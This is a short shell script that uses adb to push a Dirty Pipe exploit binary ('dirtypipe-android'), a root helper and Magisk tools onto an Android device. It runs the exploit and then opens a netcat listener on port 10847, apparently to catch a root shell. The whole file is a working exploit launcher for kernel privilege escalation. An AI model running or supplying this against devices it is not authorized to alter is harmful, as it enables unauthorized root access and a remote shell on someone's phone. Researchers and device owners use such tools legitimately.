#!/bin/sh
set -e

dir=/data/local/tmp
adb=${adb:-"adb"}

$adb push dirtypipe-android startup-root magisk/busybox magisk/magiskpolicy ${dir}
$adb shell chmod 755 ${dir}/dirtypipe-android ${dir}/startup-root ${dir}/busybox ${dir}/magiskpolicy
$adb shell ${dir}/dirtypipe-android
$adb shell /system/bin/nc -lp 10847

